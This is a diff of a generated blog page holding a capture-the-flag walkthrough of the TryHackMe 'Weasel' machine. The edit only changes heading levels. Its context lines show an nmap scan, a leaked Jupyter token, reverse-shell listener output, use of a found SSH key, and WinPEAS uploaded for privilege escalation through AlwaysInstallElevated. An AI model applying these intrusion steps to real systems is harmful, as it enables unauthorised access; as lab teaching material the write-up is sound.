@@ -47,7 +47,7 @@
     
     
         <meta name="description" content="asel/weasel.png&#34; alt=&#34;Weasel&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;description&#34;&gt;Description&lt;/h3&gt;
+&lt;h2 id=&#34;description&#34;&gt;Description&lt;/h2&gt;
 &lt;p&gt;Weasel is a Medium difficulty challenge on Tryhackme. We get a foothold on WSL through Jupyter Notebook and find a SSH key that allows us to SSH into the Windows host. Finally, we escalate privileges by exploiting AlwaysInstallElevated with a malicious Windows Installer file.&lt;/p&gt;" />
     
 
@@ -86,7 +86,7 @@
         content="http://localhost:1313/img/icon.svg" />
     
         <meta property="og:description" content="&lt;p&gt;&lt;img src=&#34;/img/weasel/weasel.png&#34; alt=&#34;Weasel&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;description&#34;&gt;Description&lt;/h3&gt;
+&lt;h2 id=&#34;description&#34;&gt;Description&lt;/h2&gt;
 &lt;p&gt;Weasel is a Medium difficulty challenge on Tryhackme. We get a f" />
     
 
@@ -105,7 +105,7 @@
         content="http://localhost:1313/img/icon.svg" />
     
         <meta name="twitter:description" content="&lt;p&gt;&lt;img src=&#34;/img/weasel/weasel.png&#34; alt=&#34;Weasel&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;description&#34;&gt;Description&lt;/h3&gt;
+&lt;h2 id=&#34;description&#34;&gt;Description&lt;/h2&gt;
 &lt;p&gt;Weasel is a Medium difficulty challenge on Tryhackme. We get a f" />
     
 
@@ -223,9 +223,9 @@
     
     
     <div><p><img src="/img/weasel/weasel.png" alt="Weasel"></p>
-<h3 id="description">Description</h3>
+<h2 id="description">Description</h2>
 <p>Weasel is a Medium difficulty challenge on Tryhackme. We get a foothold on WSL through Jupyter Notebook and find a SSH key that allows us to SSH into the Windows host. Finally, we escalate privileges by exploiting AlwaysInstallElevated with a malicious Windows Installer file.</p>
-<h3 id="recon">Recon</h3>
+<h2 id="recon">Recon</h2>
 <p>First thing&rsquo;s first. Let&rsquo;s start with a nmap scan.</p>
 <pre tabindex="0"><code># Nmap 7.94SVN scan initiated Sun Dec 22 23:42:51 2024 as: nmap -p- -A -v -oN /tmp/nmap.scan -T4 10.10.34.193
 Increasing send delay for 10.10.34.193 from 0 to 5 due to 547 out of 1366 dropped probes since last increase.
@@ -369,7 +369,7 @@ drwxrwxr-x 6 kali kali 220 Dec 22 21:15 ..
 ┌──(kali㉿kali)-[/tmp/smb]
 └─$ cat misc/jupyter-token.txt
 067470c5ddsadc54153ghfjd817d15b5d5f5341e56b0dsad78a
-</code></pre><h3 id="foothold">Foothold</h3>
+</code></pre><h2 id="foothold">Foothold</h2>
 <p>We are able to use this token to login to Jupyter Notebook on port 8888, where we can edit <code>weasel.ipynb</code> or create a new Jupyter notebook file to get a shell.</p>
 <p><img src="/img/weasel/logon.png" alt="Jupyter authenticated"></p>
 <p>I tried to use Python to execute PowerShell and get a reverse shell that way. I wasn&rsquo;t able to get a connection, and after some testing realized that Windows-specific features like PowerShell simply weren&rsquo;t being executed correctly. On the other hand, Linux commands were working perfectly fine. Given that our nmap scan revealed many details that our target is a Windows machine (e.g. RDP and Microsoft RPC). It&rsquo;s fairly safe to say that we are up against WSL.</p>
@@ -383,7 +383,7 @@ connect to [10.13.48.55] from (UNKNOWN) [10.10.34.193] 50376
 bash: cannot set terminal process group (10): Invalid argument
 bash: no job control in this shell
 (base) dev-datasci@DEV-DATASCI-JUP:~/datasci-team$ 
-</code></pre><h3 id="breaking-out-of-wsl">Breaking out of WSL</h3>
+</code></pre><h2 id="breaking-out-of-wsl">Breaking out of WSL</h2>
 <p>Checking sudo permissions is something I always do early one since it&rsquo;s usually an easy win, so I quickly found that <code>/home/dev-datasci/.local/bin/jupyter</code> can be executed with root privileges without a password.</p>
 <pre tabindex="0"><code>(base) dev-datasci@DEV-DATASCI-JUP:~/datasci-team$ sudo -l
 sudo -l
@@ -485,7 +485,7 @@ SMB         10.10.34.193    445    DEV-DATASCI-JUP  1001: DEV-DATASCI-JUP\sshd (
 </code></pre><p>We can therefore ssh onto the Windows host OS.</p>
 <pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
 └─$ ssh -i dev-datasci-lowpriv_id_ed25519 dev-datasci-lowpriv@10.10.34.193
-</code></pre><h3 id="privilege-escalation">Privilege Escalation</h3>
+</code></pre><h2 id="privilege-escalation">Privilege Escalation</h2>
 <p>We can use WinPEAS to facilitate our enumeration. I transferred it to the Windows host through scp.</p>
 <pre tabindex="0"><code>┌──(kali㉿kali)-[~]
 └─$ scp -i /tmp/id_rsa ~/winPEASany.exe dev-datasci-lowpriv@10.10.34.193:C:\Users\datasci-team\winpeas.exe    
